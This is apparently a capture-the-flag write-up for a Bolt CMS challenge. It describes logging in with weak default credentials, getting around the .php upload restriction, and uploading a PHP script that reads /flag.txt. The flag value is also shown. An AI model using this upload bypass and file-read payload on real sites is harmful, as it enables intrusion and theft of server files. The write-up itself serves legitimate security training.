## bolt

Built with Bolt, PHP. Pretty straightforward - go to /login, credentials are "admin" and "password", see the file upload field. We cannot upload `.php` files, but there are two ways to bypass this:

1. Upload the file with a different extension and change it afterwards.
2. Modify `config.yml` file to accept `.php` files.

As for the malicious file content, here's how to print the flag file content to the console:

```
<?php 
    $file_contents = file_get_contents("/flag.txt");
    echo '<script>';
    echo 'console.log('. json_encode($file_contents, JSON_HEX_TAG) .')';
    echo '</script>';
?>
```

Once it's uploaded and opened, check the console.

_CTF{b12e3b34c581d4f3c66c00cc7f8dabec8838dab0acf26c2cfbe2f7d291326f75}_